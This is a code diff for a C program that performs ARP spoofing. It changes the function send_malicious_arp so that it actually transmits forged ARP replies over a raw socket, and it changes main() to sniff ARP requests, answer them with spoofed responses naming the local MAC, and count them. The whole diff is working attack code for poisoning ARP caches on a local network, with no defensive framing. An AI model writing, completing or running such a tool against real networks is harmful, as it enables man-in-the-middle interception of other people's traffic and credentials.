@@ -135,32 +135,39 @@ void set_and_log_interface(char *interface_string){
 }
 
 
-int send_malicious_arp(const struct inet_frame *request){
+int send_malicious_arp(const int socket_fd, const socklen_t len,
+                       const struct sockaddr_ll *address,
+                       const Byte *memory, const Byte *mac_address)
+{
     // Build the ARP response
-    struct inet_frame response;
-    generate_arp_reply(request, &response, LOCAL_MAC);
+    Byte *response = create_arp_reply_from_bytes(memory, mac_address);
+    ssize_t _ret = -1;
 
-    // Send the malicious response
-    if(response.arp_segment.op_code[1] == 0x2){
-        return 1;
+    // Send the malicious response on the socket connection.
+    if(response[21] == 0x2){
+        _ret = sendto(socket_fd, response, ARP_RESP_SIZE, 0, address, len);
+        s_free(response, ARP_RESP_SIZE);
     }
-    return 0;
+
+    if (_ret != ARP_RESP_SIZE){
+        return 0;
+    }
+    return 1;
 }
 
 
 int main(){
     int socket_r;
-    int packet_num = 0;
-    double timestamp;
     Byte mem[BUFFER];
     struct ifreq ifr;
-    struct sockaddr_ll src_addr;
+    struct sockaddr_ll sock_addr;
     struct timespec start, current;
     struct inet_frame i_frame;
     size_t data_length;
-    socklen_t addr_len = sizeof(src_addr);
+    socklen_t sock_len = sizeof(sock_addr);
     char interface[16];
     int request;
+    int spoofs = 0;
 
 
     // Init process
@@ -169,23 +176,27 @@ int main(){
     if(!init_socket(&socket_r)){return -1;}
     init_mac(interface);
     set_if(&ifr, interface);
-    bind_socket(socket_r, &ifr, &src_addr,addr_len, interface);
+    bind_socket(socket_r, &ifr, &sock_addr, sock_len, interface);
     clock_gettime(CLOCK_MONOTONIC, &start);
 
     // Sniffing process
-    while(1){
+    while(spoofs < 1){
         // TODO: Create a condition that if KeyboardInterrupt signal is sent, exit the program safely.
         data_length = recvfrom(socket_r, mem, BUFFER, 0, NULL, NULL);
         if (data_length > 0) {
             request = setup_inet_frame_from_raw_bytes(&i_frame, mem, data_length);
             if(is_protocol(i_frame, ARP) && request){
-                send_malicious_arp(&i_frame);
+                if(send_malicious_arp(socket_r, sock_len, &sock_addr,
+                                   mem, LOCAL_MAC)){
+                    spoofs++;
+                }
                 logger("Received an ARP Request", INFO);
                 print_inet_frame(i_frame);
             }
-        }
+        } else { break; }
     }
 
-    (socket_r);
+    logger("Done ARP Spoofing, sent %d malicious ARP responses", INFO, spoofs);
+    shutdown(socket_r, SHUT_RDWR);
     return 0;
 }
